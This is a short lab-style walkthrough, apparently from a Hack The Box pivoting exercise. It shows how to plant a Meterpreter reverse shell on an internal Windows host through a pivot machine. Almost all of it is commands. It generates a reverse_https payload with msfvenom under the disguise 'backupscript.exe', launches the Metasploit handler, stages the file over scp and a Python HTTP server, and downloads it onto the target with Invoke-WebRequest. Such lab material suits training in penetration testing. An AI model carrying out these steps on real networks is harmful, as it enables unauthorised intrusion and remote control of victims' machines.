One is able to install a backdoor or a reverse shell on the off network system with the help of port forwarding.

First one will need to set up a payload.
```bash
user@htb$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# Launch the handler
msf6 > use exploit/multi/handler

# Copy the file to the machine
user@htb$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Back to the pivot host
ubuntu@Webserver$ python3 -m http.server 8123

# Downloading via the Windows host
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```